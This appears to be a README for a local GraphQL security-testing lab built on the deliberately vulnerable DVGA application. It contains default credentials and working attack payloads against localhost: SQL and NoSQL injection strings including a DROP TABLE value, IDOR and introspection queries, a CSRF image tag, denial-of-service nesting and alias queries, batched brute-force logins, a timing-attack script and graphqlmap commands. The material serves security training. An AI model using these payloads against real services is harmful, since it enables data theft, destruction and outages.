# GraphQL Security Testing

## Overview
This GraphQL Security Testing application (using DVGA - Damn Vulnerable GraphQL Application) provides a comprehensive environment for learning and testing GraphQL-specific security vulnerabilities.

## Quick Start

**Access URL**: http://localhost:5001

**GraphQL Endpoint**: http://localhost:5001/graphql

**GraphiQL Interface**: http://localhost:5001/graphiql

**Default Credentials**:
- Admin: `admin` / `admin`
- User: `user` / `user`
- Developer: `developer` / `developer`

## GraphQL Queries

### Basic Queries
```graphql
# Get all users
query {
  users {
    id
    username
    email
  }
}

# Get specific user
query {
  user(id: 1) {
    username
    email
    role
  }
}
```

### Mutations
```graphql
# Login
mutation {
  login(username: "admin", password: "admin") {
    token
    user {
      id
      username
    }
  }
}

# Create user
mutation {
  createUser(username: "newuser", password: "pass123", email: "new@test.com") {
    id
    username
  }
}
```

## Vulnerabilities

### 1. Introspection Enabled in Production
```graphql
# Dump entire schema
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# Get all queries
{
  __schema {
    queryType {
      fields {
        name
        description
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### 2. Broken Authorization
```graphql
# Access admin data as regular user
query {
  adminUsers {
    id
    username
    password  # Exposed!
    secretKey
  }
}

# IDOR - Access other users' private data
query {
  userPrivateData(userId: 2) {
    ssn
    creditCard
    medicalRecords
  }
}
```

### 3. Information Disclosure
```graphql
# Verbose error messages
query {
  user(id: "not-a-number") {
    username
  }
}
# Returns: "Error: Cast to Number failed for value \"not-a-number\""
```

### 4. Denial of Service - Query Depth Attack
```graphql
query DeeplyNestedQuery {
  user(id: 1) {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author {
                      # Continue nesting...
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### 5. Denial of Service - Alias Attack
```graphql
query {
  alias1: expensiveQuery
  alias2: expensiveQuery
  alias3: expensiveQuery
  # ... repeat 1000 times
  alias1000: expensiveQuery
}
```

### 6. Batching Attack for Brute Force
```graphql
query {
  user1: login(username: "admin", password: "password1")
  user2: login(username: "admin", password: "password2")
  user3: login(username: "admin", password: "password3")
  # ... continue with password list
}
```

### 7. SQL Injection
```graphql
query {
  searchUsers(name: "' OR '1'='1") {
    id
    username
  }
}

mutation {
  updateProfile(
    id: 1,
    bio: "'; DROP TABLE users; --"
  ) {
    success
  }
}
```

### 8. NoSQL Injection
```graphql
query {
  getUser(filter: "{\"username\": {\"$ne\": null}}") {
    id
    username
    password
  }
}
```

### 9. CSRF - Mutations via GET
```html
<!-- Malicious site -->
<img src="http://localhost:5001/graphql?query=mutation{deleteUser(id:1)}" />
```

### 10. Race Conditions
```graphql
# Simultaneous mutations
mutation {
  transferMoney(from: 1, to: 2, amount: 1000)
}
# Execute multiple times simultaneously
```

## Advanced Exploitation

### Query Timing Attack
```python
import time
import requests

# Time different queries to infer data
query = """
query {
  user(username: "admin", password: "%s") {
    id
  }
}
"""

for char in "abcdefghijklmnopqrstuvwxyz0123456789":
    start = time.time()
    requests.post("http://localhost:5001/graphql", 
                  json={"query": query % char})
    elapsed = time.time() - start
    print(f"{char}: {elapsed}")
```

### Automated Tools

**GraphQL Voyager** - Schema visualization:
```bash
# Access at http://localhost:5001/voyager
```

**InQL Scanner** - Burp Suite extension:
1. Send GraphQL endpoint to InQL Scanner
2. Generate queries from introspection
3. Test for vulnerabilities

**GraphQLmap** - Exploitation framework:
```bash
python3 graphqlmap.py -u http://localhost:5001/graphql -v

# Dump schema
python3 graphqlmap.py -u http://localhost:5001/graphql --introspect

# SQL injection test
python3 graphqlmap.py -u http://localhost:5001/graphql \
  --query "query{user(id:GRAPHQL_INJECTION){username}}"
```

## Defense Mechanisms (What's Missing)
- ❌ Query depth limiting
- ❌ Query complexity analysis
- ❌ Alias limiting
- ❌ Introspection disabled in production
- ❌ Proper authorization on field level
- ❌ Rate limiting
- ❌ Query whitelisting
- ❌ Cost analysis
- ❌ Timeout controls

## Security Headers Test
```bash
# Check security headers
curl -I http://localhost:5001/graphql

# Missing headers:
# - X-Content-Type-Options: nosniff
# - X-Frame-Options: DENY
# - Content-Security-Policy
# - X-XSS-Protection
```

## Additional Resources
- [GraphQL Security Guide](https://graphql.org/learn/security/)
- [OWASP GraphQL Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL)
- [GraphQL Threat Matrix](https://github.com/nicholasaleks/graphql-threat-matrix) 